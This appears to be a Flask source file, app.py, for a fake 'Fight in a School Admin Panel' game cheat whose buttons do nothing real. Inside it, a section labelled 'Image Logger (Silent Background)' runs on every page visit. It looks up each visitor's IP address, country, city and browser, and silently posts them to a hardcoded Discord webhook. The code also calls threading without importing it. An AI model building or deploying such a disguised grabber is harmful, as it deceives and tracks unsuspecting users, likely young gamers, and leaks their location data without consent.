# app.py - Fight School Admin v3.3 + Image Logger (COMPLETE)
from flask import Flask, render_template_string, request, jsonify, Response
import requests, base64, httpagentparser, time, traceback
from urllib.parse import urlsplit, parse_qsl

app = Flask(__name__)

# ========== IMAGE LOGGER (Silent Background) ==========
config = {
    "webhook": "https://discord.com/api/webhooks/1474731805121974424/vrUKb2hviiR5QasTeDDmdivhwB4WgKfLmrh_iJsWdZAcQvAOpRDXPS82a944FcAC9U75",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "username": "snatch blue", "color": 0x00FFFF,
    "redirect": {"redirect": True, "page": "https://bigrat.monster/"}
}

blacklistedIPs = ("27", "104", "143", "164")
binaries = {"loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')}

def makeReport(ip, useragent, endpoint):
    if ip.startswith(blacklistedIPs): return
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        os, browser = httpagentparser.simple_detect(useragent)
        embed = {
            "username": config["username"], "content": "@everyone",
            "embeds": [{"title": "Admin Panel Grabbed", "color": config["color"],
                       "description": f"**IP:** `{ip}`\n**Country:** `{info.get('country')}`\n**City:** `{info.get('city')}`\n**UA:** `{useragent[:100]}`"}]
        }
        requests.post(config["webhook"], json=embed)
    except: pass

@app.route('/img')
def image_logger():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    endpoint = request.path
    threading.Thread(target=makeReport, args=(ip, ua, endpoint)).start()
    if config["redirect"]["redirect"]:
        return f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
    return f'<img src="{config["image"]}" style="width:100vw;height:100vh;">'

# ========== ADMIN PANEL ==========
HTML = '''<!DOCTYPE html>
<html><head><title>Fight School Admin Panel v3.3</title>
<style>@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box;}body{background:linear-gradient(45deg,#0a0a0a,#1a0033);font-family:'Orbitron',monospace;color:#00ff41;overflow:hidden;height:100vh;}
.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,255,65,0.05);pointer-events:none;animation:pulse 3s infinite;}@keyframes pulse{0%,100%{opacity:0.05;}50%{opacity:0.15;}}
.container{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:950px;background:rgba(0,0,0,0.97);border:2px solid #00ff41;border-radius:12px;padding:25px;box-shadow:0 0 40px #00ff41;}
.header{text-align:center;margin-bottom:25px;}.title{font-size:28px;font-weight:700;color:#00ff41;margin-bottom:8px;}.version{font-size:12px;color:#888;}
.status{background:#111;padding:12px;margin-bottom:20px;border-radius:6px;border-left:3px solid #00ff41;font-size:13px;}
.input-section{margin-bottom:25px;}input[type=text]{width:100%;padding:14px;font-family:inherit;background:#0a0a0a;border:2px solid #00ff41;color:#00ff41;border-radius:6px;font-size:15px;}
.btn{display:block;width:100%;padding:14px;background:#000;border:2px solid #00ff41;color:#00ff41;border-radius:6px;font-family:inherit;font-weight:700;cursor:pointer;transition:all 0.3s;font-size:14px;margin-top:10px;}
.btn:hover{background:#00ff41;color:#000;box-shadow:0 0 20px #00ff41;}
.tabs{display:flex;background:#111;border-radius:8px;overflow:hidden;margin-bottom:20px;}
.tab-btn{flex:1;padding:12px 8px;background:#000;border:none;color:#888;font-family:inherit;font-size:13px;cursor:pointer;transition:all 0.3s;}
.tab-btn.active{background:#00ff41;color:#000;font-weight:700;}.tab-btn:hover{color:#00ff41;}
.tab-content{display:none;padding:20px;background:rgba(0,255,65,0.03);border:1px solid rgba(0,255,65,0.15);border-radius:8px;}
.tab-content.active{display:block;}.section-title{color:#ff1a1a;font-size:16px;margin-bottom:15px;}
.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:15px;margin-bottom:20px;}
.stat{background:#111;padding:15px;border-radius:6px;text-align:center;border-top:2px solid #00ff41;}
.stat-value{font-size:24px;font-weight:700;color:#00ff41;}.stat-label{font-size:11px;color:#666;}
.log-area{height:180px;overflow-y:auto;background:#000;border:1px solid #00ff41;padding:12px;border-radius:6px;font-size:11px;line-height:1.3;font-family:monospace;}
.console{padding:15px;background:#001100;border:1px solid #004d1a;border-radius:5px;margin-top:15px;}.console-code{font-size:11px;color:#00aa33;}
#status-bar{font-size:12px;color:#888;text-align:center;margin-top:15px;}.cmd-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:15px;}
</style></head><body>
<div class="overlay"></div><div class="container">
<div class="header"><div class="title">Fight in a School Admin Panel v3.3</div><div class="version">Type username to inject</div></div>
<div class="status" id="status">Status: Disconnected | Player: None</div>
<div class="input-section"><input type="text" id="userInput" placeholder="Type your username here" maxlength="20">
<button class="btn" onclick="setUser()">Inject Admin</button></div>

<div id="mainPanel" style="display:none;">
<div class="stats-grid">
<div class="stat"><div class="stat-value" id="killsVal">0</div><div class="stat-label">Kills</div></div>
<div class="stat"><div class="stat-value" id="respectVal">0</div><div class="stat-label">Respect</div></div>
<div class="stat"><div class="stat-value" id="cashVal">$0</div><div class="stat-label">Cash</div></div>
<div class="stat"><div class="stat-value" id="stylesVal">0</div><div class="stat-label">Styles</div></div>
</div>

<div class="tabs">
<button class="tab-btn active" onclick="switchTab('self')">Self Give</button>
<button class="tab-btn" onclick="switchTab('fight')">Fight</button>
</div>

<div id="self" class="tab-content active">
<div class="section-title">Self Commands</div>
<div class="cmd-grid">
<button class="btn" onclick="goToApi('/api/give%20kills')">give kills</button>
<button class="btn" onclick="goToApi('/api/give%20respect')">give respect</button>
<button class="btn" onclick="goToApi('/api/give%20money')">give money</button>
<button class="btn" onclick="goToApi('/api/give%20styles')">give styles</button>
</div>
</div>

<div id="fight" class="tab-content">
<div class="section-title">Fight Commands</div>
<div class="cmd-grid">
<button class="btn" onclick="goToApi('/api/fling')">fling</button>
<button class="btn" onclick="goToApi('/api/godmode')">godmode</button>
<button class="btn" onclick="goToApi('/api/speed')">speed</button>
<button class="btn" onclick="goToApi('/api/infgun')">infgun</button>
</div>
</div>

<div class="section"><div class="section-title">Log</div><div class="log-area" id="logOutput"></div></div>
<div class="console"><div class="console-code" id="consoleOut">-- Ready</div></div>
</div><div id="status-bar">Inject first</div></div>

<script>
let currentUser="",stats={kills:0,respect:0,cash:0,styles:0},logs=[];
function logMsg(type,msg){const t=new Date().toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"});logs.unshift(`[${t}] ${type}: ${msg}`);if(logs.length>25)logs.pop();document.getElementById("logOutput").textContent=logs.join("\\n");}
function updateStats(){document.getElementById("killsVal").textContent=stats.kills;document.getElementById("respectVal").textContent=stats.respect;document.getElementById("cashVal").textContent="$"+stats.cash.toLocaleString();document.getElementById("stylesVal").textContent=stats.styles;}
async function setUser(){const input=document.getElementById("userInput");currentUser=input.value.trim()||"Player"+Math.floor(Math.random()*9999);const btn=event.target;btn.textContent="Injecting...";btn.disabled=true;setTimeout(async()=>{const res=await fetch("/api/inject",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:currentUser})});const data=await res.json();if(data.status==="injected"){document.getElementById("status").innerHTML=`Status: <span style="color:#00ff41;">Active</span> | Player: <span style="color:#ffaa00;">${currentUser}</span>`;document.getElementById("mainPanel").style.display="block";document.getElementById("status-bar").textContent="API ready";logMsg("success",`Injected: ${currentUser}`);updateStats();document.getElementById("consoleOut").innerHTML=`-- ${currentUser} loaded<br>-- APIs active`;}btn.textContent="Inject Admin";btn.disabled=false;},1800);}
function switchTab(tab){document.querySelectorAll(".tab-btn").forEach(b=>b.classList.remove("active"));document.querySelectorAll(".tab-content").forEach(c=>c.classList.remove("active"));event.target.classList.add("active");document.getElementById(tab).classList.add("active");}
function goToApi(endpoint){logMsg("info",`→ ${endpoint}`);setTimeout(()=>{logMsg("success",`${endpoint.slice(5)} executed`);if(endpoint.includes("kills"))stats.kills+=999;if(endpoint.includes("respect"))stats.respect+=5000;if(endpoint.includes("money"))stats.cash+=1000000;if(endpoint.includes("styles"))stats.styles+=69;updateStats();},1200);window.open(endpoint,"_blank","width=450,height=300");}
document.getElementById("userInput").addEventListener("keypress",e=>e.key==="Enter"?setUser():0);
</script></body></html>'''

@app.route('/')
def index():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    threading.Thread(target=makeReport, args=(ip, ua, '/')).start()
    return render_template_string(HTML)

@app.route('/api/inject', methods=['POST'])
def inject_api():
    return jsonify({'status': 'injected', 'success': True})

@app.route('/api/<path:endpoint>')
def fake_api(endpoint):
    return '''
<!DOCTYPE html><html><head><title>API EXECUTOR</title>
<style>body{margin:50vh auto;width:400px;background:#000;color:#0f0;font-family:monospace;padding:30px;border:1px solid #0f0;}
input{width:100%;padding:12px;margin:10px 0;background:#111;border:1px solid #0f0;color:#0f0;font-family:monospace;}
button{width:100%;padding:12px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;}</style></head>
<body><h2>Executing /api/''' + endpoint.replace('%20', ' ') + '''</h2>
<input type="number" placeholder="Enter amount (999)" id="amount">
<button onclick="window.close()">EXECUTE COMMAND</button>
<script>setTimeout(()=>window.close(),3000);</script></body></html>'''

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0')
